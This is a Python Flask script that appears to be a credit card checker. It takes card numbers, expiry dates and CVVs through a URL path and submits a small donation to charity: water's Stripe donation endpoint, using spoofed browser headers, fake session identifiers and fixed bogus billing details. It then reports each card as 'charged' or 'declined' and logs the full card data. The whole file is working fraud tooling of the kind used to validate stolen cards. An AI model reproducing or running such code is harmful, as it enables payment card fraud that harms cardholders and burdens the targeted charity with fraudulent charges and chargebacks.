import requests
import random
import string
import json
import logging
from flask import Flask, jsonify, request
from urllib.parse import unquote

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def process_credit_card(cc_input):
    parts = cc_input.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC input format. Expected CC|MM|YYYY|CVV")
    
    return {
        'number': parts[0].strip(),
        'exp_month': parts[1].strip(),
        'exp_year': parts[2].strip()[-2:], 
        'cvc': parts[3].strip()
    }

def make_donation(cc_input, email, name, amount=5):
    try:
        card_details = process_credit_card(cc_input)
    except ValueError as e:
        return {"status": "declined", "message": str(e)}
    
    # Generate fresh session identifiers
    muid = f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
    guid = generate_random_string(32)
    sid = generate_random_string(32)
    
    stripe_headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    stripe_data = {
        'type': 'card',
        'billing_details[address][postal_code]': '91003',
        'billing_details[address][city]': 'New York',
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': 'New York',
        'billing_details[email]': email,
        'billing_details[name]': name,
        'card[number]': card_details['number'],
        'card[cvc]': card_details['cvc'],
        'card[exp_month]': card_details['exp_month'],
        'card[exp_year]': card_details['exp_year'],
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/f5ddf352d5; stripe-js-v3/f5ddf352d5; card-element',
        'referrer': 'https://www.charitywater.org',
        'time_on_page': str(random.randint(700000, 800000)),
        'key': 'pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
    }

    try:
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data
        )
        
        if stripe_response.status_code != 200:
            try:
                error_data = stripe_response.json()
                error_message = error_data.get('error', {}).get('message', 'Stripe payment method creation failed')
                return {"status": "declined", "message": error_message}
            except:
                return {"status": "declined", "message": "Stripe payment method creation failed"}
        
        payment_method = stripe_response.json()
        payment_method_id = payment_method.get('id')
        
        if not payment_method_id:
            return {"status": "declined", "message": "Could not get payment method ID from Stripe"}
       
        donation_headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.charitywater.org',
            'priority': 'u=1, i',
            'referer': 'https://www.charitywater.org/',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        donation_data = {
            'country': 'us',
            'payment_intent[email]': email,
            'payment_intent[amount]': str(amount),
            'payment_intent[currency]': 'usd',
            'payment_intent[payment_method]': payment_method_id,
            'disable_existing_subscription_check': 'false',
            'donation_form[amount]': str(amount),
            'donation_form[comment]': '',
            'donation_form[display_name]': '',
            'donation_form[email]': email,
            'donation_form[name]': name.split()[0] if ' ' in name else name,
            'donation_form[payment_gateway_token]': '',
            'donation_form[payment_monthly_subscription]': 'false',
            'donation_form[surname]': name.split()[1] if ' ' in name else '',
            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
            'donation_form[setup_intent_id]': '',
            'donation_form[subscription_period]': '',
            'donation_form[metadata][email_consent_granted]': 'true',
            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
            'donation_form[metadata][phone_number]': '',
            'donation_form[metadata][plaid_account_id]': '',
            'donation_form[metadata][plaid_public_token]': '',
            'donation_form[metadata][uk_eu_ip]': 'false',
            'donation_form[metadata][with_saved_payment]': 'false',
            'donation_form[address][address_line_1]': 'New York',
            'donation_form[address][address_line_2]': '',
            'donation_form[address][city]': 'New York',
            'donation_form[address][country]': '',
            'donation_form[address][zip]': '91003',
        }

        donation_response = requests.post(
            'https://www.charitywater.org/donate/stripe',
            headers=donation_headers,
            data=donation_data
        )
        
        if donation_response.status_code == 200:
            return {"status": "charged", "message": "Donation successful"}
        else:
            try:
                response_data = donation_response.json()
                error_message = response_data.get('error', {}).get('message', 'Donation submission failed')
                return {"status": "declined", "message": error_message}
            except json.JSONDecodeError:
                return {"status": "declined", "message": "Donation submission failed"}
            
    except Exception as e:
        return {"status": "declined", "message": f"An error occurred: {str(e)}"}

@app.route('/gateway=stripe5$/key=rocky/cc=<cc>', methods=['GET'])
def handle_donation(cc):
    try:
        # Decode the cc parameter to handle URL-encoded characters
        decoded_cc = unquote(cc)
        logger.info(f"Received request with cc: {decoded_cc}")
        result = make_donation(decoded_cc, "darkboy3366@gmail.com", "Dark Boy")
        return jsonify(result)
    except Exception as e:
        logger.error(f"Server error: {str(e)}")
        return jsonify({"status": "declined", "message": f"Server error: {str(e)}"}), 500

@app.errorhandler(404)
def page_not_found(e):
    logger.warning(f"404 error: {str(e)}")
    return jsonify({"status": "declined", "message": "Invalid endpoint or parameters"}), 404

if __name__ == '__main__':
    app.run(debug=True)
